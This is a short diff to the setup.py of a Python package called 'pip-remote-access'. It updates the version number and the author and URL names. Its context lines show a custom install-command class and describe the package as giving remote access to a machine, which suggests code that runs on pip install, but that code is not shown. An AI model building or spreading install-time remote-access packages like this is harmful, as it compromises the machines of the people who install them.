@@ -99,7 +99,7 @@ class execute(install):
             pass
         
 
-VERSION = '0.0.2'
+VERSION = '0.0.3'
 DESCRIPTION = 'To Show the vulnerability of the system'
 LONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'
 CLASSIFIERS = [
@@ -115,14 +115,14 @@ CLASSIFIERS = [
 setup(
     name="pip-remote-access",
     version=VERSION,
-    author="The_Robin_Hood (Ansari)",
+    author="The-Robin-Hood (Ansari)",
     description=DESCRIPTION,
     long_description= open('README.md').read(),
     long_description_content_type="text/markdown",
     packages=find_packages(),
-    url = "https://github.com/The_Robin_Hood/pip-remote-access",
+    url = "https://github.com/The-Robin-Hood/pip-remote-access",
     project_urls = {
-        "Bug Tracker": "https://github.com/The_Robin_Hood/pip-remote-access/issues",
+        "Bug Tracker": "https://github.com/The-Robin-Hood/pip-remote-access/issues",
     },
     install_requires=[''],
     keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],
